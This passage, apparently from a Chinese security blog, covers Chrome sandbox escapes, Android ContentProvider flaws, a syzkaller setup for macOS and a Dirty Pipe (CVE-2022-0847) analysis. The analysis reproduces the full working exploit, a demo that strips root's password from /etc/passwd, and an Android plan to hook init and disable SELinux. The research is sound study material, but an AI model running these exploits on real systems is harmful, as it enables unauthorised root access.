就整个系列而言，我们还看到了沙盒架构，加上Chrome浏览器中漏洞的快速修复，确实有助于使其难以获得完整的链（并确保完整的链即使进入野外也不会持续太久）。本系列中使用的渲染器漏洞从首次报告到修复大约需要六周时间，而沙盒逃逸也需要类似的时间来修复，这对Chrome来说是相当标准的。这大大降低了渲染器漏洞与沙盒逃逸重叠的可能性。正如我们在这一系列案例中看到的那样，由于这种快速修复漏洞的方式，在稳定版本的Chrome浏览器中，渲染器漏洞并没有与沙盒逃逸重叠在一起。正是修复漏洞的效率使沙箱变得更加有效。另一方面，我们也从沙盒逃逸的帖子中看到了每次启动一次的ASLR（即从Zygote分叉的进程）如何大大降低了安卓系统中应用沙盒的有效性。虽然Chrome的基本地址在渲染器和浏览器之间仍然是随机的，但许多其他库不是，我仍然能够使用这些库中的小工具，不费吹灰之力就逃出Chrome的沙箱。虽然每次启动一次的ASLR对于缓解远程攻击仍然非常有用，但正如我们在这篇文章中所看到的，编写漏洞的大部分精力都花在了击败ASLR上，它对于本地权限升级没有什么用处。由于两个主要平台（Windows和Android）都实施了每次启动一次的ASLR，这仍然是Chrome沙箱的最大弱点之一。","link":"/2021/12/02/CVE-2020-15972-Chrome%E6%B5%8F%E8%A7%88%E5%99%A8RCE/"},{"title":"ContentProvider漏洞笔记","text":"ContentProvider介绍ContentProvider的主要目的是为应用程序之间共享数据提供渠道。ContentProvider以一个或多个表的形式将数据呈现给外部应用，这些表与关系型数据库中的表类似。行表示提供程序收集的某种类型数据的实例，行中的每一列表示为一个实例所收集的单个数据。 其他组件和 ContentProvider之间的关系： 访问方式 示例代码： 12345678910111213ContentResolver res = this.getContentResolver(); for (int id = minId; id &lt; maxId; id++) { Uri uri = Uri.parse(PUBLIC_DOWNLOADS_ID_URI + id); Cursor cur = res.query(uri, null, null, null, null); try { if (cur != null &amp;&amp; cur.getCount() &gt; 0) { lastId = Math.max(id, lastId); } } finally { if (cur != null) cur.close(); } } Content URI内容 URI 用来标识数据。内容 URI 包括整个提供程序的符号名称（其 授权 ）和指向表的名称（ 路径 ）。格式如下： 1content://user_dictionary/words APIContentProvider提供的 API类似于 SQL语句，主要有 query、insert、update、delete和 getType等。 query()ContentResolver.query() -&gt; ContentProvider.query()，示例代码： 1234567// Queries the user dictionary and returns resultscursor = getContentResolver().query( UserDictionary.Words.CONTENT_URI, // The content URI of the words table projection, // The columns to return for each row selectionClause, // Selection criteria selectionArgs, // Selection criteria sortOrder); // The sort order for the returned rows query()与 sql查询的比较： query() 参数 SELECT 关键字/参数 备注 Uri FROM table_name Uri 映射至提供程序中名为 table_name 的表。 projection col,col,col,... projection 是检索到的每个行所应包含的列的数组。 selection WHERE col = value selection 指定选择行的条件。 selectionArgs （没有完全等效项，选择参数会替换选择子句中的 ? 占位符。） sortOrder ORDER BY col,col,... sortOrder 指定在返回的 Cursor 中各行的显示顺序。 规避SQL注入的方式对SQL语句的操作不要使用串联的方式： 12// Constructs a selection clause by concatenating the user's input to the column nameString selectionClause = &quot;var = &quot; + userInput; 应该使用占位符与单独的查询参数： 12345678// Constructs a selection clause with a replaceable parameterString selectionClause = &quot;var = ?&quot;;// Defines an array to contain the selection argumentsString[] selectionArgs = {&quot;&quot;};// Sets the selection argument to the user's inputselectionArgs[0] = userInput; 权限查询分为两步： 请求对提供程序的读取访问权限。 将操作语句发送至提供程序。 对 ContentProvider的访问权限是在应用程序的 &lt;use-permission&gt;中指定的，无法动态申请。 如果仅使用 ContentProvider在自己的应用之间共享数据，最好将使用的 android:protectionLevel 属性设置为 signature 保护级别。 还可以通过以下方式提供更细化的访问权限：声明 android:grantUriPermissions属性，并使用用来启动组件的 Intent对象中的 FLAG_GRANT_READ_URI_PERMISSION和 FLAG_GRANT_WRITE_URI_PERMISSION标记。 android:grantUriPermissions : 默认为 false, 当为 false时需要增加 &lt;grant-uri-permission&gt;来指定允许临时权限访问的具体 Content URI, 设置为 true时表示整个 Provider都接受临时权限访问数据。 &lt;grant-uri-permission&gt; : 用于指定具体的 Content URI, 和 Path-level权限的 &lt;path-permisson&gt;类似。 FLAG_GRANT_READ_URI_PERMISSION和 FLAG_GRANT_WRITE_URI_PERMISSION : 配合 Intent.setFlags让 Intent中的 URI能够被无权限的 app临时访问。 没有&lt;path-permisson&gt;的，就是没有访问权限。 参考链接https://ioactive.com/multiple-vulnerabilities-in-androids-download-provider-cve-2018-9468-cve-2018-9493-cve-2018-9546/ https://ioactive.com/discovering-and-exploiting-a-vulnerability-in-androids-personal-dictionary/","link":"/2022/06/12/ContentProvider%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"},{"title":"Darwin搭建syzkaller环境","text":"前言记录一下在Mac上搭建syzkaller运行环境的过程。 创建macOS VM 下载macOS镜像，在VMware中创建虚拟机； 在安装界面中，选择 Utilities -&gt; Terminal； 输入 csrutil disable禁用系统完整性保护； 输入 csrutil authenticated-root disable禁用授权root； 退出终端，继续安装macOS，创建一个user账户； 进入系统后，选择 System Preferences -&gt; Software Update -&gt; Advanced… ，禁用自动更新； 进入 System Preferences -&gt; Energy Saver ，选择 Prevent computer from sleeping automatically when the display is off； 进入 System Preferences -&gt; Sharing，开启 Remote Login 以启用ssh； 最后，可以使用 sudo launchctl unload -w /System/Library/LaunchDaemons/com.apple.WindowServer.plist禁用GUI显示。 内核编译编译内核： 下载对应macOS虚拟机版本的Xcode； 提取Xcode，然后移动到/Applications目录下； 启动Xcode，同意协议； 在用户主目录下创建一个kernel目录； 进入kernel目录； 下载： curl https://jeremya.com/sw/Makefile.xnudeps &gt; Makefile.xnudeps make -f Makefile.xnudeps macos_version=11.5 xnudeps，自动下载内核源码编译需要的工具，然后自动编译内核源码； 进入 ~/kernel/xnu-&lt;version&gt;/； 通过 git am，将syzkaller的Darwin补丁应用上； MakeInc.def和kasan.c的补丁用于构建KASAN内核； ksancov.h补丁是构建syzkallers执行器所需要的。执行器是C++的，因此不喜欢无效指针的转换； cpuid.c和cpu_threads.c补丁是编译的内核在Qemu上启动所需要的； 运行 mount ，查看根挂载设备，这里举例是 /dev/disk2s5s1 on / (apfs, sealed, local, read-only, journaled)，只需要记住设备名称，即 /dev/disk2s5； 进入 ~/kernel/xnu-&lt;version&gt;/，运行以下命令： 1234567891011121314151617mkdir -p BUILD/mntsudo mount -o nobrowse -t apfs /dev/&lt;your_disk&gt; $PWD/BUILD/mntmake SDKROOT=macosx TARGET_CONFIGS=&quot;KASAN X86_64 NONE&quot; KSANCOV=1kmutil create -a x86_64 -Z -n boot sys \\-B BUILD/BootKernelExtensions.kc.kasan \\-S BUILD/SystemKernelExtensions.kc.kasan \\-k BUILD/obj/kernel.kasan \\--elide-identifier com.apple.driver.AppleIntelTGLGraphicsFramebuffersudo ditto BUILD/BootKernelExtensions.kc.kasan &quot;$PWD/BUILD/mnt/System/Library/KernelCollections/&quot;sudo ditto BUILD/SystemKernelExtensions.kc.kasan &quot;$PWD/BUILD/mnt/System/Library/KernelCollections/&quot;sudo ditto BUILD/obj/kernel.kasan &quot;$PWD/BUILD/mnt/System/Library/Kernels/&quot;sudo bless --folder $PWD/BUILD/mnt/System/Library/CoreServices --bootefi --create-snapshotsudo nvram boot-args=&quot;-v kcsuffix=kasan wlan.skywalk.enable=0&quot; 重启虚拟机后，内核将改变， uname -a: Darwin users-Mac.local 20.6.0 Darwin Kernel Version 20.6.0: Mon Aug 9 16:12:43 PDT 2021; user:xnu-7195.141.2/BUILD/obj/KASAN_X86_64 x86_64。 在宿主机上运行以下命令： 1234mkdir -p ~/115/src/Users/user/kernel/ ~/115/objrsync -r mac:/Users/user/kernel/xnu-7195.141.2 ~/115/src/Users/user/kernel/mv ~/115/src/Users/user/kernel/xnu-7195.141.2/BUILD/obj/KASAN_X86_64/kernel.kasan ~/115/obj/mv ~/115/src/Users/user/kernel/xnu-7195.141.2/BUILD/obj/KASAN_X86_64/kernel.kasan.dSYM/ ~/115/obj/ Qemu VM准备在虚拟机查看EFI分区，这里为/dev/disk0s1： 1234567891011121314151617user@users-Mac ~ % diskutil list/dev/disk0 (internal, physical): #: TYPE NAME SIZE IDENTIFIER 0: GUID_partition_scheme *69.8 GB disk0 1: EFI EFI 209.7 MB disk0s1 2: Apple_APFS Container disk1 69.6 GB disk0s2/dev/disk1 (synthesized): #: TYPE NAME SIZE IDENTIFIER 0: APFS Container Scheme - +69.6 GB disk1 Physical Store disk0s2 1: APFS Volume macos - Data 43.2 GB disk1s1 2: APFS Volume Preboot 385.6 MB disk1s2 3: APFS Volume Recovery 623.2 MB disk1s3 4: APFS Volume VM 1.1 MB disk1s4 5: APFS Volume macos 16.0 GB disk1s5 6: APFS Snapshot com.apple.bless.4099... 16.0 GB disk1s5s1 下载 OpenCore-v13.iso.gz ，通过命令进行提取： gzip -d OpenCore-v13.iso.gz。查找EFI分区的偏移和大小： 12345678user@users-Mac ~ % hdiutil pmap ./OpenCore-v13.isoMEDIA: &quot;&quot;; Size 150 MB [307200 x 512]; Max Transfer Blocks 2048SCHEME: 1 GPT, &quot;GPT Partition Scheme&quot; [16]SECTION: 1 Type:'MAP'; Size 150 MB [307200 x 512]; Offset 34 Blocks (307133 + 67) x 512ID Type Offset Size Name (1)-- -------------------- ------------ ------------ -------------------- -------- 1 EFI 40 307120 disk image 接着运行命令 ：sudo dd if=./OpenCore-v13.iso of=/dev/disk0s1 bs=512 iseek=40 count=307120。 现在通过sudo mount -t msdos /dev/disk0s1 ~/mnt/加载EFI磁盘。还需要对OpenCores的配置文件做一些小小的编辑。禁用启动设备选择器，因为这将阻止在模糊测试期间完全自动启动虚拟机。此外，需要设置boot-args。在VMware Fusion中，我们能够使用正常的macOS工具，如nvram和csrutil。而在OpenCore中，需要在config.plist中设置这些设置。 编辑 ~/mnt/EFI/OC/config.plist ： 123456789101112131415161718192021index 8537ca8..a46de97 100755--- a/Users/user/mnt/EFI/OC/config.plist+++ b/Users/user/mnt/EFI/OC/config.plist@@ -799,7 +799,7 @@ &lt;key&gt;PollAppleHotKeys&lt;/key&gt; &lt;true/&gt; &lt;key&gt;ShowPicker&lt;/key&gt;- &lt;true/&gt;+ &lt;false/&gt; &lt;key&gt;TakeoffDelay&lt;/key&gt; &lt;integer&gt;0&lt;/integer&gt; &lt;key&gt;Timeout&lt;/key&gt;@@ -944,7 +944,7 @@ &lt;key&gt;SystemAudioVolume&lt;/key&gt; &lt;data&gt;Rg==&lt;/data&gt; &lt;key&gt;boot-args&lt;/key&gt;- &lt;string&gt;keepsyms=1&lt;/string&gt;+ &lt;string&gt;-v kcsuffix=kasan wlan.skywalk.enable=0 keepsyms=1 debug=0x100008 kasan.checks=4294967295&lt;/string&gt; &lt;key&gt;csr-active-config&lt;/key&gt; &lt;data&gt;Jg8=&lt;/data&gt; &lt;key&gt;prev-lang:kbd&lt;/key&gt; 准备isa-applesmc在启动时，macOS通过从其系统管理控制器中读取一个值并与它所期望的值相比较来检查它是否在一个合适的Mac上启动。现在要检索这个值，并在以后把它传递给qemu。 下载 smc_read.c 源码 gcc -Wall -o smc_read smc_read.c -framework IOKit ./smc_read 运行记录结果，在后面将其替换到标有的地方。 从Qemu启动macOS VM 找到VM的虚拟磁盘位置，一般是在 ~/Virtual\\ Machines.localized/macOS-11.5-20G71.vmwarevm/Virtual\\ Disk.vmdk，然后将其转化为qcow2格式： qemu-img convert -U ./Virtual\\ Disk.vmdk -O qcow2 ~/115/mac_hdd.qcow； OVMF目前没有被打包在Homebrew中。需要从ubuntu下载ovmf软件包。通过ar -xv ./ovmf_2020.11-4_all.deb和tar -xvf ./data.tar.xz进行提取。然后mv ./usr/share/OVMF /usr/local/share/OVMF。 启动（没成功）： 123456789101112qemu-system-x86_64 \\ -device isa-applesmc,osk=&quot;&lt;YOUR_APPLE_SMC_HERE&gt;&quot; \\ -accel hvf -machine q35 -smp &quot;2&quot;,cores=&quot;2&quot;,sockets=&quot;1&quot; -m &quot;4096&quot; \\ -cpu Penryn,vendor=GenuineIntel,+invtsc,vmware-cpuid-freq=on,&quot;+pcid,+ssse3,+sse4.2,+popcnt,+avx,+aes,+xsave,+xsaveopt,check&quot; \\ -drive if=pflash,format=raw,readonly=on,file=&quot;/usr/local/share/OVMF/OVMF_CODE.fd&quot; \\ -drive if=pflash,format=raw,readonly=on,file=&quot;/usr/local/share/OVMF/OVMF_VARS.fd&quot; \\ -device ich9-intel-hda -device hda-duplex -device ich9-ahci,id=sata \\ -device ide-hd,bus=sata.4,drive=MacHDD \\ -drive id=MacHDD,if=none,file=&quot;/Users/user/115/macos_11_5.qcow&quot;,format=qcow2 \\ -netdev user,id=net0,hostfwd=tcp::1042-:22, -device e1000-82545em,netdev=net0,id=net0 \\ -device usb-ehci,id=ehci -usb -device usb-kbd -device usb-tablet \\ -monitor stdio -vga vmware 然后应该能看到macOS的用户界面，并且能够ssh user@localhost -p 1042。确认已经启动到KASAN内核。 12user@users-Mac ~ % uname -aDarwin users-Mac.local 20.6.0 Darwin Kernel Version 20.6.0: Mon Aug 9 16:12:43 PDT 2021; user:xnu-7195.141.2/BUILD/obj/KASAN_X86_64 x86_64 编译运行Syzkaller123git clone https://github.com/google/syzkallercd syzkallermake HOSTOS=darwin HOSTARCH=amd64 TARGETOS=darwin TARGETARCH=amd64 SOURCEDIR=/Users/user/115/src/Users/user/kernel/xnu-7195.141.2 需要g++来使C语言复制者工作。通过homebrew安装gcc@11 需要binutils的addr2line来使/cover端点工作。通过homebrew安装binutils 在你的.zshrc中添加类似这样的内容，export PATH=&quot;/usr/local/opt/binutils/bin:$PATH&quot;。重新启动shell 将以下内容保存到~/115/sykaller.cfg。注意要用&lt;YOUR_APPLE_SMC_HERE&gt;代替。 123456789101112131415161718192021{ &quot;target&quot;: &quot;darwin/amd64&quot;, &quot;http&quot;: &quot;127.0.0.1:56741&quot;, &quot;sshkey&quot;: &quot;/Users/user/.ssh/id_macos115&quot;, &quot;workdir&quot;: &quot;/Users/user/sk_darwin/&quot;, &quot;kernel_obj&quot;: &quot;/Users/user/115/obj/&quot;, &quot;kernel_src&quot;: &quot;/Users/user/115/src/&quot;, &quot;syzkaller&quot;: &quot;/Users/user/go/src/github.com/google/syzkaller&quot;, &quot;procs&quot;: 2, &quot;type&quot;: &quot;qemu&quot;, &quot;cover&quot;: true, &quot;image&quot;: &quot;/Users/user/115/macos_11_5.qcow&quot;, &quot;vm&quot;: { &quot;count&quot;: 2, &quot;cpu&quot;: 2, &quot;mem&quot;: 4096, &quot;efi_code_device&quot;: &quot;/usr/local/share/OVMF/OVMF_CODE.fd&quot;, &quot;efi_vars_device&quot;: &quot;/usr/local/share/OVMF/OVMF_VARS.fd&quot;, &quot;apple_smc_osk&quot;: &quot;&lt;YOUR_APPLE_SMC_HERE&gt;&quot; }} 通过~/115/bin/syz-manager -config=/root/115/syzkaller.cfg启动syzkaller并在浏览器中打开http://localhost:56741。","link":"/2022/04/30/Darwin%E6%90%AD%E5%BB%BAsyzkaller%E7%8E%AF%E5%A2%83/"},{"title":"DirtyPipe-Android利用","text":"前言CVE-2022-0847也叫Dirty Pipe，该漏洞影响内核5.8以上Linux版本，在5.16.11、5.15.25、5.10.102中修复。由于这个漏洞也影响了Android系统，所以这里主要关注分析对Android系统的影响。 该漏洞能够覆盖任意只读文件，这将导致非特权进程将代码注入到root进程中。 漏洞发现漏洞提交者维护了关于网站的日志管理服务，这个日志服务的功能之一就是打包每天对应网站每天的访问日志，在月末的时候，提供一个日志下载功能，当用户请求这个功能时，该功能通过HTTP，先发送一个ZIP头，再发送每天的日志压缩包，最后发送一个中央目录（就是另一个头的意思）。这个功能机遇splice()，可以将数据直接从硬盘发送到HTTP连接，省去了将所有日志文件再压缩到一起的这么一个操作，提高了响应效率。 但是，这个功能出现了bug。有用户反馈下载的日志文件损坏，无法解压，这个bug被反馈了很多次。结果就是，漏洞提交者开始找bug，千辛万苦，发现了个新漏洞，可怜的程序员。 漏洞原理一些概念 页面，基于虚拟内存的操作系统中用于内存管理的最小数据单元，最小大小为4kb。 页面缓存，最近访问过的内存页面，存储在内存中，以加快访问速度，当内核认为该页面不再需要时，就会回收这些页面。通过页面缓存，系统可以直接将页面映射到用户空间，这样就去除了复制的成本。 管道，对于进程间通信而言，通常使用共享内存页面，其中一个进程读取，另一个进程写入，通常管道跨越多个内存页。 匿名管道，当进程间共享的信息不占用整个内存页时，可以被另一个管道重用，导致来自不同管道的数据共存于同一个内存页中。 管道标志，管道标志指定状态和权限等特征。 splice()在将数据从文件拷贝到管道中时，首先将数据加载到页面缓存中，然后在页面缓存中创建一个struct pipe_buffer指针，但是不同于匿名管道，随后写入的数据不能附加到该页面上，因为该页面的持有者为页面缓存。 管道管道是内核提供的一种通信机制，由pipe/pipe2函数创建，返回两个文件描述符，一个读取，一个写入。 管道在内核中的实现方式 通常管道的缓存空间总长度为65536 个字节，用页的形式进行管理，一共16页，每页4096字节，形成一个环形链表，结构如下： 注意这里的16个页面并不连续，而是通过数组进行表示，pipe-&gt;head负责写入，pipe-&gt;tail负责读取。看一下pipe_write函数，关键之处在于第二步： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889static ssize_tpipe_write(struct kiocb *iocb, struct iov_iter *from){ struct file *filp = iocb-&gt;ki_filp; struct pipe_inode_info *pipe = filp-&gt;private_data; unsigned int head; ssize_t ret = 0; size_t total_len = iov_iter_count(from); ssize_t chars; bool was_empty = false; bool wake_next_writer = false; ··· ··· ··· ··· head = pipe-&gt;head; was_empty = pipe_empty(head, pipe-&gt;tail); chars = total_len &amp; (PAGE_SIZE-1); if (chars &amp;&amp; !was_empty) { //[1]pipe 缓存不为空，则尝试是否能从当前最后一页&quot;接着&quot;写 unsigned int mask = pipe-&gt;ring_size - 1; struct pipe_buffer *buf = &amp;pipe-&gt;bufs[(head - 1) &amp; mask]; int offset = buf-&gt;offset + buf-&gt;len; if ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp; offset + chars &lt;= PAGE_SIZE) { /*[2]如果PIPE_BUF_FLAG_CAN_MERGE 标志位存在，代表该页允许接着写 *如果写入长度不会跨页，则接着写，否则直接另起一页 */ ret = pipe_buf_confirm(pipe, buf); ··· ret = copy_page_from_iter(buf-&gt;page, offset, chars, from); ··· } buf-&gt;len += ret; ··· } } for (;;) {//[3]如果上一页没法接着写，则重新起一页 ··· ··· head = pipe-&gt;head; if (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) { unsigned int mask = pipe-&gt;ring_size - 1; struct pipe_buffer *buf = &amp;pipe-&gt;bufs[head &amp; mask]; struct page *page = pipe-&gt;tmp_page; int copied; if (!page) {//[4]重新申请一个新页 page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT); if (unlikely(!page)) { ret = ret ? : -ENOMEM; break; } pipe-&gt;tmp_page = page; } spin_lock_irq(&amp;pipe-&gt;rd_wait.lock); head = pipe-&gt;head; ··· ··· pipe-&gt;head = head + 1; spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock); /* Insert it into the buffer array */ buf = &amp;pipe-&gt;bufs[head &amp; mask]; buf-&gt;page = page;//[5]将新申请的页放到页数组中 buf-&gt;ops = &amp;anon_pipe_buf_ops; buf-&gt;offset = 0; buf-&gt;len = 0; if (is_packetized(filp)) buf-&gt;flags = PIPE_BUF_FLAG_PACKET; else buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE; //[6]设置flag，默认PIPE_BUF_FLAG_CAN_MERGE pipe-&gt;tmp_page = NULL; copied = copy_page_from_iter(page, 0, PAGE_SIZE, from); //[7]拷贝操作 ··· ··· ret += copied; buf-&gt;offset = 0; buf-&gt;len = copied; ··· ··· } ··· ··· } ··· ··· return ret;} splice系统调用定义 1234567/* splice() moves data between two file descriptors without copying * between kernel address space and user address space. * It transfers up to len bytes of data from the file descriptor fd_in * to the file descriptor fd_out, where one of the file descriptors must refer to a pipe. */ssize_t splice(int fd_in, off64_t *off_in, int fd_out, off64_t *off_out, size_t len, unsigned int flags); 作用 拼接数据。 调用栈如下： SYSCALL_DEFINE6(splice,...) -&gt; __do_sys_splice -&gt; __do_splice-&gt; do_splice splice_file_to_pipe -&gt; do_splice_to generic_file_splice_read(in-&gt;f_op-&gt;splice_read 默认为 generic_file_splice_read) call_read_iter -&gt; filemap_read copy_page_to_iter -&gt; copy_page_to_iter_pipe copy_page_to_iter_pipe将pipe 缓存页结构指向要传输的文件的文件缓存页： 1234567891011121314151617181920212223242526272829static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t bytes, struct iov_iter *i){ struct pipe_inode_info *pipe = i-&gt;pipe; struct pipe_buffer *buf; unsigned int p_tail = pipe-&gt;tail; unsigned int p_mask = pipe-&gt;ring_size - 1; unsigned int i_head = i-&gt;head; size_t off; ··· ··· off = i-&gt;iov_offset; buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];//[1]获取对应的pipe缓存页 ··· ··· buf-&gt;ops = &amp;page_cache_pipe_buf_ops;//[2]修改pipe缓存页的相关信息指向文件缓存页 get_page(page); buf-&gt;page = page; //[2]页指针指向了文件缓存页 buf-&gt;offset = offset;//[2]offset len 等设置为当前信息(通过splice传入参数决定) buf-&gt;len = bytes; pipe-&gt;head = i_head + 1; i-&gt;iov_offset = offset + bytes; i-&gt;head = i_head;out: i-&gt;count -= bytes; return bytes;} 总结：splice的零拷贝（是指不需要拷贝动作，来实现数据的传输），是将pipe的缓存页，变为页面缓存，方法是改变指针： linux 内核page cache机制linux将打开的文件放到缓存页之中，缓存页被使用过后也会保存一段时间避免不必要的IO操作。短时间内访问同一个文件，都会操作相同的文件缓存页，而不是反复打开。 漏洞起因PIPE_BUF_FLAG_CAN_MERGE标志是在内核5.8中引入的，第一次commit (f6dd975583bd8ce088400648fd9819e4691c8958)是在2020年5月，表示可以合并页面的管道中的数据，而无需重写内存中的数据。 但起因还要更早一些，在2016年的commit (241699cd72a8489c9446ae3910ddd243e9b9061b)中，引入了两个新的函数用于分配新的struct pipe_buffer，然而却忘了初始化其flags成员。结合PIPE_BUF_FLAG_CAN_MERGE标志，就可以覆写页面缓存中的数据。 漏洞利用利用限制： 攻击者必须具有读取权限，因为需要将splice()页面放入管道。 偏移量不能在页面边界上，因为该页面的至少一个字节必须已拼接到管道中。 写入不能跨越页面边界，因为将为其余部分创建一个新的匿名管道。 文件无法调整大小，因为管道有自己的页面填充管理，并且不会告诉页面缓存附加了多少数据。 利用步骤： 以读取模式打开一个文件。 使用pipe()系统调用创建一个管道，此函数为允许写入和读取的描述符提供相同的进程访问权限。 将任意数据写入管道进行填充，将使用PIPE_BUF_FLAG_CAN_MERGE标志初始化内存页面。 所有页面都标记了以后，就可以通过从管道中读取数据来释放它们。 当内核使用2016年引入的函数保存页面时，就不会初始化页面标志，则仍然为PIPE_BUF_FLAG_CAN_MERGE标志。 使用splice()函数加载开始时打开的文件，分配给这个文件的内存页将与我们的空管道相同。 直接覆盖管道中的数据。 漏洞提交者给出的exp： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156/* SPDX-License-Identifier: GPL-2.0 *//* * Copyright 2022 CM4all GmbH / IONOS SE * * author: Max Kellermann &lt;max.kellermann@ionos.com&gt; * * Proof-of-concept exploit for the Dirty Pipe * vulnerability (CVE-2022-0847) caused by an uninitialized * &quot;pipe_buffer.flags&quot; variable. It demonstrates how to overwrite any * file contents in the page cache, even if the file is not permitted * to be written, immutable or on a read-only mount. * * This exploit requires Linux 5.8 or later; the code path was made * reachable by commit f6dd975583bd (&quot;pipe: merge * anon_pipe_buf*_ops&quot;). The commit did not introduce the bug, it was * there before, it just provided an easy way to exploit it. * * There are two major limitations of this exploit: the offset cannot * be on a page boundary (it needs to write one byte before the offset * to add a reference to this page to the pipe), and the write cannot * cross a page boundary. * * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\\nssh-ed25519 AAA......\\n' * * Further explanation: https://dirtypipe.cm4all.com/ */#define _GNU_SOURCE#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/user.h&gt;#ifndef PAGE_SIZE#define PAGE_SIZE 4096#endif/** * Create a pipe where all &quot;bufs&quot; on the pipe_inode_info ring have the * PIPE_BUF_FLAG_CAN_MERGE flag set. */static void prepare_pipe(int p[2]){ if (pipe(p)) abort(); const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ); static char buffer[4096]; /* fill the pipe completely; each pipe_buffer will now have the PIPE_BUF_FLAG_CAN_MERGE flag */ for (unsigned r = pipe_size; r &gt; 0;) { unsigned n = r &gt; sizeof(buffer) ? sizeof(buffer) : r; write(p[1], buffer, n); r -= n; } /* drain the pipe, freeing all pipe_buffer instances (but leaving the flags initialized) */ for (unsigned r = pipe_size; r &gt; 0;) { unsigned n = r &gt; sizeof(buffer) ? sizeof(buffer) : r; read(p[0], buffer, n); r -= n; } /* the pipe is now empty, and if somebody adds a new pipe_buffer without initializing its &quot;flags&quot;, the buffer will be mergeable */}int main(int argc, char **argv){ if (argc != 4) { fprintf(stderr, &quot;Usage: %s TARGETFILE OFFSET DATA\\n&quot;, argv[0]); return EXIT_FAILURE; } /* dumb command-line argument parser */ const char *const path = argv[1]; loff_t offset = strtoul(argv[2], NULL, 0); const char *const data = argv[3]; const size_t data_size = strlen(data); if (offset % PAGE_SIZE == 0) { fprintf(stderr, &quot;Sorry, cannot start writing at a page boundary\\n&quot;); return EXIT_FAILURE; } const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1; const loff_t end_offset = offset + (loff_t)data_size; if (end_offset &gt; next_page) { fprintf(stderr, &quot;Sorry, cannot write across a page boundary\\n&quot;); return EXIT_FAILURE; } /* open the input file and validate the specified offset */ const int fd = open(path, O_RDONLY); // yes, read-only! :-) if (fd &lt; 0) { perror(&quot;open failed&quot;); return EXIT_FAILURE; } struct stat st; if (fstat(fd, &amp;st)) { perror(&quot;stat failed&quot;); return EXIT_FAILURE; } if (offset &gt; st.st_size) { fprintf(stderr, &quot;Offset is not inside the file\\n&quot;); return EXIT_FAILURE; } if (end_offset &gt; st.st_size) { fprintf(stderr, &quot;Sorry, cannot enlarge the file\\n&quot;); return EXIT_FAILURE; } /* create the pipe with all flags initialized with PIPE_BUF_FLAG_CAN_MERGE */ int p[2]; prepare_pipe(p); /* splice one byte from before the specified offset into the pipe; this will add a reference to the page cache, but since copy_page_to_iter_pipe() does not initialize the &quot;flags&quot;, PIPE_BUF_FLAG_CAN_MERGE is still set */ --offset; ssize_t nbytes = splice(fd, &amp;offset, p[1], NULL, 1, 0); if (nbytes &lt; 0) { perror(&quot;splice failed&quot;); return EXIT_FAILURE; } if (nbytes == 0) { fprintf(stderr, &quot;short splice\\n&quot;); return EXIT_FAILURE; } /* the following write will not create a new pipe_buffer, but will instead write into the page cache, because of the PIPE_BUF_FLAG_CAN_MERGE flag */ nbytes = write(p[1], data, data_size); if (nbytes &lt; 0) { perror(&quot;write failed&quot;); return EXIT_FAILURE; } if ((size_t)nbytes &lt; data_size) { fprintf(stderr, &quot;short write\\n&quot;); return EXIT_FAILURE; } printf(&quot;It worked!\\n&quot;); return EXIT_SUCCESS;} 调试环境：https://registry.hub.docker.com/r/chenaotian/cve-2022-0847 12345678docker run -d -ti --rm -h cvedebug --name cvedebug --cap-add=SYS_PTRACE chenaotian/cve-2022-0847:latest /bin/bashdocker exec -it cvedebug /bin/bashcd ~/cve-2022-0847gcc exp.c -o exp --static &amp;&amp; cp exp ./rootfs &amp;&amp; cd rootfsfind . | cpio -o --format=newc &gt; ../rootfs.imgcd ../ ./boot.sh 12345678gdb ./vmlinuxtarget remote :10086directory /root/linux-5.13b do_spliceb copy_page_to_iter_pipe b pipe_writeignore 3 15c 12345678910pwndbg&gt; p *(struct pipe_inode_info *) pipepwndbg&gt; p (struct pipe_buffer)pipe-&gt;bufs[0]$2 = { page = 0xffffea0000134cc0, offset = 0, len = 4096, ops = 0xffffffff82019fc0 &lt;anon_pipe_buf_ops&gt;, flags = 16, ==&gt; 标记 private = 0} 一个例子编译上面的exp。 123456$ head -1 /etc/passwd # 确认root受密码保护 root:x:0:0:root:/root:/usr/bin/zsh$ su # 确认需要密码$ ./exp /etc/passwd 4 '::0:0:rootx' # 删除root密码保护 It worked!$ su # 不需要输入密码 Android利用DirtyPipe for Android，这个漏洞利用复现有以下几个问题： 需要编译内核源码，比较耗时间。 现有的pixel4 xl，Android12内核是4.14，没有到5.0以上。 没有pixel6的模拟器。 利用思路 在 Android 上，没有 /etc/passwd 和 suid。此外，SELinux 监控系统上的每个操作。 但是利用dirtypipe可以通过任何进程读取（和覆盖）系统库（/system/lib/lib*.so）。 init 进程加载许多系统库（动态链接）。 init 进程可以读取（和覆盖）比 app 进程更多的文件。 多次使用dirtypipe来加载定制的内核模块。 利用过程 该漏洞利用包括以下阶段： 钩子初始化过程。 重写 /vendor/bin/modprobe 和供应商库。 fork() /execve() 进入 /vendor/bin/modprobe。 加载内核模块以禁用 selinux。 阶段1 覆盖init使用的/system/lib64/libc++.so。 Hook函数_ZNSt3__115basic_streambufIcNS_11char_traitsIcEEEC2Ev (std::__1::basic_streambuf&lt;char, std::__1::char_traits&lt;char&gt; &gt;::basic_streambuf()) 通过运行命令setprop来触发该功能。 发送下一阶段的有效载荷/system/lib/libldacBT_enc.so。 libc++空间有限。 32位的libldacBT_enc.so不应该频繁使用。 libc++ 中的有效负载通过nmap加载用于 stage2 的有效负载libldacBT_enc.so。 